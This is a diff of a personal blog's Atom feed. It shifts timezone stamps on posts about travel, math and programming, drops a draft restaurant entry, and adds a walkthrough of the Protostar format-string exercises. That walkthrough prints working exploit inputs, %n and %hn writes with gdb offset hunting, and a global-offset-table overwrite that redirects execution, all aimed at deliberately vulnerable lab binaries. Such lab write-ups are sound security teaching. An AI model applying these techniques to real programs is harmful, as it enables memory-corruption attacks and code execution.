@@ -4,7 +4,7 @@
   <title><![CDATA[Louis Li]]></title>
   <link href="http://louisrli.github.io/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2015-08-20T22:49:10+08:00</updated>
+  <updated>2015-08-29T17:05:38+02:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -14,37 +14,9 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Best Meat and Rice in Taipei: Barbecue Pork Rice (招牌烤肉饭)]]></title>
-    <link href="http://louisrli.github.io/blog/2015/08/17/meat-and-rice-zhaopaikaoroufan/"/>
-    <updated>2015-08-17T00:00:00+08:00</updated>
-    <id>http://louisrli.github.io/blog/2015/08/17/meat-and-rice-zhaopaikaoroufan</id>
-    <content type="html"><![CDATA[<p>TODO intro</p>
-
-<p>I have a <a href="https://www.youtube.com/playlist?list=PLtD-FIua473Cf6Ylh3PeoEmoq3c6BJH0S">travel-related YouTube
-channel</a> on life in Taiwan.
-Subscribe!</p>
-
-<!-- more -->
-
-<h2 id="directions">Directions</h2>
-
-<p>The closest subway exit is Taipei Main Station exit M6 (Caesar Park Hotel). </p>
-
-<p>Google maps link</p>
-
-<h2 id="signature-dish">Signature Dish</h2>
-
-<h2 id="menu">Menu</h2>
-
-<p><em>Last updated: August 2015</em></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
     <title type="html"><![CDATA[Yangmingshan Transportation (阳明山)]]></title>
     <link href="http://louisrli.github.io/blog/2015/08/11/yangmingshan/"/>
-    <updated>2015-08-11T00:00:00+08:00</updated>
+    <updated>2015-08-11T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2015/08/11/yangmingshan</id>
     <content type="html"><![CDATA[<p>This is an English guide for transportation to <a href="http://en.wikipedia.org/wiki/Yangmingshan">Yangmingshan
 (阳明山)</a>, a national park north of Taipei. 
@@ -81,7 +53,7 @@ park.</p>
   <entry>
     <title type="html"><![CDATA[English Guide to Sun Moon Lake (日月潭)]]></title>
     <link href="http://louisrli.github.io/blog/2015/07/10/sun-moon-lake/"/>
-    <updated>2015-07-10T00:00:00+08:00</updated>
+    <updated>2015-07-10T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2015/07/10/sun-moon-lake</id>
     <content type="html"><![CDATA[<p>This is a guide to transportation, food, activities, and lodging for a Sun Moon Lake trip, based on
 my own experiences. My friend and I traveled from Taipei to Sun Moon Lake in July 2015, staying one
@@ -259,7 +231,7 @@ Subscribe!</p>
   <entry>
     <title type="html"><![CDATA[Senior Thesis: Security Analysis of Java Web Applications Using String Constraint Analysis]]></title>
     <link href="http://louisrli.github.io/blog/2015/05/03/senior-thesis/"/>
-    <updated>2015-05-03T00:00:00+08:00</updated>
+    <updated>2015-05-03T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2015/05/03/senior-thesis</id>
     <content type="html"><![CDATA[<p>I submitted my undergraduate thesis at the beginning of April, titled “Security Analysis of Java Web
 Applications Using String Constraint Analysis.” I was advised by Professor Stephen Chong.</p>
@@ -291,7 +263,7 @@ injection and cross-site scripting.</p>
   <entry>
     <title type="html"><![CDATA[Being a Better Teaching Assistant: Five Concrete Tips]]></title>
     <link href="http://louisrli.github.io/blog/2015/01/28/five-tips-for-being-an-effective-teaching-fellow/"/>
-    <updated>2015-01-28T12:13:28+08:00</updated>
+    <updated>2015-01-28T05:13:28+01:00</updated>
     <id>http://louisrli.github.io/blog/2015/01/28/five-tips-for-being-an-effective-teaching-fellow</id>
     <content type="html"><![CDATA[<p>The purpose of this post is to provide concrete pointers to becoming a better undergraduate teaching
 fellow (Harvard lingo for student instructor, course assistant, etc.). </p>
@@ -406,7 +378,7 @@ teaching as an undergraduate.</em></p>
   <entry>
     <title type="html"><![CDATA[Topological Proof of Bolzano-Weierstrass Without Constructing Sequences]]></title>
     <link href="http://louisrli.github.io/blog/2014/11/07/bolzano-weierstrass-without-sequences/"/>
-    <updated>2014-11-07T00:00:00+08:00</updated>
+    <updated>2014-11-07T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2014/11/07/bolzano-weierstrass-without-sequences</id>
     <content type="html"><![CDATA[<p>The <a href="http://en.wikipedia.org/wiki/Bolzano%E2%80%93Weierstrass_theorem">Bolzano-Weierstrass theorem</a>
 is a common theorem taught in introductory real analysis and topology courses. </p>
@@ -481,7 +453,7 @@ follows that <script type="math/tex"> \{ x_i \} </script> must have a convergent
   <entry>
     <title type="html"><![CDATA[det(-A) = -det(A) for Odd Square Matrix]]></title>
     <link href="http://louisrli.github.io/blog/2014/11/06/negative-determinant-odd-even-matrix/"/>
-    <updated>2014-11-06T00:00:00+08:00</updated>
+    <updated>2014-11-06T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2014/11/06/negative-determinant-odd-even-matrix</id>
     <content type="html"><![CDATA[<p>The proof for this is straightforward, but I didn’t find it explicitly stated elsewhere on the web
 – it may just be one of those propositions that’s hard to phrase as a search query. In words:
@@ -518,7 +490,7 @@ is odd, then <script type="math/tex"> A </script> has at least one eigenvector w
   <entry>
     <title type="html"><![CDATA[Tips for Computer Science Internship Interviews]]></title>
     <link href="http://louisrli.github.io/blog/2014/01/18/tips-for-computer-science-internship-interviews/"/>
-    <updated>2014-01-18T00:00:00+08:00</updated>
+    <updated>2014-01-18T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2014/01/18/tips-for-computer-science-internship-interviews</id>
     <content type="html"><![CDATA[<p>This post is meant to help computer science undergraduates looking for a software engineering internship in the summer. Applying to internships can be daunting, and this post will hopefully address some of the commonly asked questions that I see on Reddit’s <a href="http://www.reddit.com/r/cscareerquestions">cscareerquestions</a>.
 Along with some other miscellanea regarding applications, this post covers two things: </p>
@@ -857,7 +829,7 @@ their careers. If this article helped you, please consider donating to the <a hr
   <entry>
     <title type="html"><![CDATA[Erasable Code Contracts]]></title>
     <link href="http://louisrli.github.io/blog/2014/01/09/erasable-contracts/"/>
-    <updated>2014-01-09T00:00:00+08:00</updated>
+    <updated>2014-01-09T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2014/01/09/erasable-contracts</id>
     <content type="html"><![CDATA[<p>This semester, I took a course on the science of cybersecurity, targeted toward an audience with some programming languages background. </p>
 
@@ -888,7 +860,7 @@ their careers. If this article helped you, please consider donating to the <a hr
   <entry>
     <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
     <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
-    <updated>2013-08-22T00:00:00+08:00</updated>
+    <updated>2013-08-22T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
     <content type="html"><![CDATA[<p>I’ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you’re reading this during the school year, there probably won’t be anything, since student dining isn’t open.</p>
 
@@ -901,7 +873,7 @@ their careers. If this article helped you, please consider donating to the <a hr
   <entry>
     <title type="html"><![CDATA[How To Use Meteor.js Routing with Disqus]]></title>
     <link href="http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus/"/>
-    <updated>2013-07-29T00:00:00+08:00</updated>
+    <updated>2013-07-29T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus</id>
     <content type="html"><![CDATA[<p>On most sites, using Disqus as the commenting system is as simple as copying the <a href="http://disqus.com/admin/universalcode/">Universal Code</a> (also known as <code>embed.js</code>) into a web page. In single-page JavaScript applications, however, much of the rendering is on the client-side. This means that <code>embed.js</code> might lead to stale Disqus threads or function incorrectly as pages are re-rendered.</p>
 
@@ -1087,7 +1059,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Five Research Tips for First-Time Undergraduate Researchers]]></title>
     <link href="http://louisrli.github.io/blog/2013/06/28/researchtips/"/>
-    <updated>2013-06-28T00:00:00+08:00</updated>
+    <updated>2013-06-28T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2013/06/28/researchtips</id>
     <content type="html"><![CDATA[<p>Today, I submitted my first extended abstract to the ASSETS 2013 Student Research Competition. This marks my first tangible output in undergraduate research. This isn’t quite the end of the story – I plan to continue gathering results and writing a paper for submission to CHI. It is, however, time for reflection.</p>
 
@@ -1153,7 +1125,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Sophomore Spring: A Brief List of What I Learned]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester/"/>
-    <updated>2013-05-13T00:00:00+08:00</updated>
+    <updated>2013-05-13T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester</id>
     <content type="html"><![CDATA[<p>Here’s a concise list of [some of] the things that I learned this semester. I would say that the things that I learned this semester are a lot more diverse than those from last semester (I’d describe last semester as…math).</p>
 
@@ -1219,7 +1191,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Up-to-date Guide on How to Delete All Posts on Your Tumblr]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts/"/>
-    <updated>2013-05-11T00:00:00+08:00</updated>
+    <updated>2013-05-11T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts</id>
     <content type="html"><![CDATA[<p>One of my friends asked me how to batch delete all of the posts on a <a href="http://tumblr.com">Tumblr</a>. There are some PHP and Ruby scripts on the internet that claim to achieve this, but they seem to be outdated in regards to the Tumblr API, or they require installing some packages.</p>
 
@@ -1257,7 +1229,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[A Rational Approximation of Pi Using the Pigeonhole Principle]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle/"/>
-    <updated>2013-01-31T00:00:00+08:00</updated>
+    <updated>2013-01-31T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle</id>
     <content type="html"><![CDATA[<p>Below is a short Python script that finds a fractional approximation of \(\pi\) using the first 1001 multiples of \(\pi\) (the case with 11 multiples of \(\pi\) can easily be done by hand). It makes use of the <em>pigeonhole principle</em>. The 11-multiple version of the problem has been used in the module teaching the pigeonhole principle in various classes that I have taken or taught.</p>
 
@@ -1388,7 +1360,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Chrome Extensions: Taking Screenshots with Javascript/jQuery, HTML5, Canvas]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot/"/>
-    <updated>2013-01-16T00:00:00+08:00</updated>
+    <updated>2013-01-16T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot</id>
     <content type="html"><![CDATA[<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>
 
@@ -1532,7 +1504,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Using Quicksilver Mac and AppleScript to Adjust System Volume]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/15/applescript-volume/"/>
-    <updated>2013-01-15T00:00:00+08:00</updated>
+    <updated>2013-01-15T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/15/applescript-volume</id>
     <content type="html"><![CDATA[<p>I’ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I’d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>-<code>f12</code> map to the normal keys.</p>
 
@@ -1583,7 +1555,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[2012 in Sideprojects]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
-    <updated>2013-01-12T00:00:00+08:00</updated>
+    <updated>2013-01-12T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
     <content type="html"><![CDATA[<p>It always surprises me how long a year is. It’s hard for me to believe that some of these projects were a year ago, but I’m happy to see my progress. Here’s a walk down memory lane for my projects in 2012, not including course projects and research.</p>
 
@@ -1698,7 +1670,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Looking Forward to Discrete Mathematics]]></title>
     <link href="http://louisrli.github.io/blog/2012/12/22/discrete-math-paper/"/>
-    <updated>2012-12-22T00:00:00+08:00</updated>
+    <updated>2012-12-22T00:00:00+01:00</updated>
     <id>http://louisrli.github.io/blog/2012/12/22/discrete-math-paper</id>
     <content type="html"><![CDATA[<p>For one of my math classes this semester (Sets and Topology), we had a short project: a three-to-five page paper on some area in mathematics. I opted for discrete mathematics, which is a topic on the broad side; five pages, of course.</p>
 
@@ -1719,7 +1691,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh/"/>
-    <updated>2012-08-30T00:00:00+08:00</updated>
+    <updated>2012-08-30T00:00:00+02:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh</id>
     <content type="html"><![CDATA[<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice – bridged networking – doesn’t work when the host has an IPv6 address.</p>
 
@@ -1776,6 +1748,192 @@ iface eth1 inet dhcp</code></pre></div>
 <p>Finally, we can SSH to the virtual machine.</p>
 
 <div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ssh user@192.168.56.101</code></pre></div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
+    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
+    <updated>2012-08-29T00:00:00+02:00</updated>
+    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
+    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Format: Level 0
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="k">)</span>
+
+<span class="go">you have hit the target correctly :)</span></code></pre></div>
+
+<!-- more -->
+<p>## Format: Level 1
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>
+
+<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
+<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div>
+
+<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x
+
+Breakpoint 1, __printf (format=0xbffff98f &quot;AAAA%08x&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/10xw $esp
+0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
+0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
+0xbffff788:     0xbffff7b8      0x08048469
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c
+(gdb) p 0xbffff98f - 0x0bffff784
+$1 = 523</code></pre></div>
+
+<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>
+
+<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /opt/protostar/bin/format1 AAAAA%08x
+
+Breakpoint 1, __printf (format=0xbffff98e &quot;AAAAA%08x&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c</code></pre></div>
+
+<ul>
+  <li><code>0xbffff784</code>: The first argument to the format string.</li>
+  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
+</ul>
+
+<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>
+
+<p>With a few calculations, we can find the correct offset.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x38\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;..%128$n&#39;</span>
+<span class="go">8..you have modified the target :)</span></code></pre></div>
+
+<h2 id="format-level-2">Format: Level 2</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
+<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div>
+
+<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%4<span class="se">\$</span>08x <span class="p">|</span> ./format2
+<span class="go">080496e4target is 0 :(</span></code></pre></div>
+
+<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%60u%4<span class="se">\$</span>n <span class="p">|</span> ./format2
+<span class="go">                                                         512you have modified the target :)</span></code></pre></div>
+
+<h2 id="format-level-3">Format: Level 3</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format3 <span class="p">|</span> grep target
+<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div>
+
+<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
+Breakpoint 1 at 0x804837c
+(gdb) run
+Starting program: /opt/protostar/bin/format3
+AAAA
+Breakpoint 1, __printf (format=0xbffff5a0 &quot;AAAA\n&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff570:
+eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
+called by frame at 0xbffff590
+source language c.
+Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
+Locals at 0xbffff568, Previous frame&#39;s sp is 0xbffff570
+Saved registers:
+ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
+(gdb) x/3xw 0xbffff568
+0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
+(gdb) x/w 0xbffff570
+0xbffff570:     0xbffff5a0
+(gdb) p 0xbffff5a0 - 0xbffff570
+= 48</code></pre></div>
+
+<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="se">\$</span>x <span class="p">|</span> ./format3
+<span class="go">AAAA41414141</span>
+<span class="go">target is 00000000 :(</span></code></pre></div>
+
+<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 44&quot;</span> <span class="p">|</span> bc
+<span class="go">68</span>
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 55&quot;</span> <span class="p">|</span> bc
+<span class="go">85</span>
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 02&quot;</span> <span class="p">|</span> bc
+<span class="go">2</span>
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 01&quot;</span> <span class="p">|</span> bc
+<span class="go">1</span></code></pre></div>
+
+<p>Finally, we write values to each of the four bytes of <code>target</code>:</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf5\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf6\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf7\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%52u%12$n%&#39;&#39;17u%13$n&#39;&#39;%173u%14$n&#39;</span> <span class="p">|</span> ./format3
+<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796</span>
+<span class="go">you have modified the target :))</span></code></pre></div>
+
+<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>
+
+<h2 id="format-level-4">Format: Level 4</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>
+
+<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s1">&#39;AAAA%4$x&#39;</span> <span class="p">|</span> ./format4
+<span class="go">AAAA41414141</span></code></pre></div>
+
+<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
+<span class="go">00000000      DF *UND* 00000000  GLIBC_2.0   _exit</span>
+<span class="go">00000000      DF *UND*  00000000  GLIBC_2.0   exit</span>
+<span class="go">08049718 R_386_JUMP_SLOT   _exit</span>
+<span class="go">08049724 R_386_JUMP_SLOT   exit</span>
+<span class="gp">$</span> objdump -t format4 <span class="p">|</span> grep hello
+<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div>
+
+<p>To confirm that our overwrite works correctly, we run a quick test:</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%4$n&#39;</span> &gt; /tmp/format4
+<span class="gp">$</span> gdb -q format4
+<span class="go">Reading symbols from /opt/protostar/bin/format4...done.</span>
+<span class="go">(gdb) run &lt; /tmp/format4</span>
+<span class="go">Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4</span>
+<span class="gp">$</span>�
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x00000004 in ?? ()</span></code></pre></div>
+
+<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%33968u%4$hn&#39;</span> <span class="p">|</span> ./format4
+<span class="gp">$</span>
+<span class="go">&lt;lots of whitespace&gt;</span>
+<span class="go">512</span>
+<span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div>
 
 ]]></content>
   </entry>
